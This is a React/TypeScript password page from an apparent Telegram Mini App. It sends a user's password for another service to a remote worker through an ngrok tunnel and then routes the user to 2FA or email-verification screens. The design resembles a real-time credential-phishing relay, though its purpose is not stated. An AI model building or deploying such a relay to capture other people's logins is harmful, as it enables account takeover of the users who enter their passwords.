// src/pages/Password.tsx
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";

import "./Password.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";

const API_BASE = "https://juiceless-hyo-pretechnical.ngrok-free.dev/api";

export const Password = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const initDataRaw = useSignal(initData.raw);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  useEffect(() => {
    const state = location.state as { username?: string } | null;
    if (state?.username) {
      setUsername(state.username);
    }
  }, [location.state]);

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      return cs;
    }

    return null;
  };

  const handleLogin = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    if (!username) {
      setToast("Username missing");
      return;
    }

    const pwd = password.trim();
    if (!pwd) {
      setToast("Please enter your password");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "enter-password",
            payload: {
              password: pwd,
              username, // 👈 on passe aussi le username au worker
            },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      // ✅ SUCCESS CASE
      if (finalState.status === "done" && finalState.result?.ok) {
        const challenge = finalState.result?.challenge;

        if (challenge === "2fa") {
          console.log("✅ PASSWORD OK → need 2FA", finalState.result);
          navigate("/twofa", { state: { username } });
          return;
        }

        if (challenge === "email_verif") {
          console.log("✅ PASSWORD OK → need EMAIL VERIFY", finalState.result);
          navigate("/email-verify", { state: { username } });
          return;
        }

        // Pas de challenge spécial
        console.log("✅ PASSWORD OK", finalState.result);
        navigate("/home", { state: { username } });
        return;
      }

      // ❌ ERROR CASE
      const msg =
        finalState.error ||
        finalState.result?.message ||
        finalState.result?.error ||
        "Invalid password";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  return (
    <div className="password-page">
      <FullScreenLoader visible={loading} text="Checking password..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="password-container">
        <input
          type="text"
          placeholder="Phone, email, or username"
          value={username}
          readOnly
          className="password-input"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="password-input"
          disabled={loading}
        />
        <button
          className="login-button"
          onClick={handleLogin}
          disabled={loading}
        >
          Log in
        </button>
      </div>
    </div>
  );
};
